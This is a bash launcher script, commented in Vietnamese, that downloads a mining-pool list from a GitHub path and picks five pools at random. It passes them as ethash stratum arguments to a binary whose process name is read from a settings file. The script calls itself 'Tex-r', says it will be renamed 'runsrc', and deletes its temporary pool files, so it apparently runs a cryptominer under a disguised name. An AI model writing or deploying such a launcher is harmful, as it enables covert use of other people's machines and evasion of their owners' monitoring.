#!/bin/bash
#Run for Tex-r sau khi cai dat se doi ten thanh runsrc
Uuname=$(cat inuser.txt)
cp ../gitpath.txt gitpath.txt
gitpathbin=$(cat gitpath.txt)

#pol conifg
wget https://raw.githubusercontent.com/$gitpathbin/main/wpoolst.txt
shuf -n 5 wpoolst.txt > wpoolst_use.txt

pool1=$(sed -n '1p' wpoolst_use.txt)
pool2=$(sed -n '2p' wpoolst_use.txt)
pool3=$(sed -n '3p' wpoolst_use.txt)
pool4=$(sed -n '4p' wpoolst_use.txt)
pool5=$(sed -n '5p' wpoolst_use.txt)

echo "-a ethash -o stratum+http://$pool1 -o stratum+http://$pool2 -o stratum+http://$pool3 -o stratum+http://$pool4 -o stratum+http://$pool5" > fnpool.txt
fnpool=$(cat fnpool.txt)
rm -rf wpoolst_use.txt
rm -rf wpoolst.txt
#pol conifg end

sleep 1
USEPROCNAME=$(cat SETPROCNAME.txt)

./$USEPROCNAME "$fnpool"
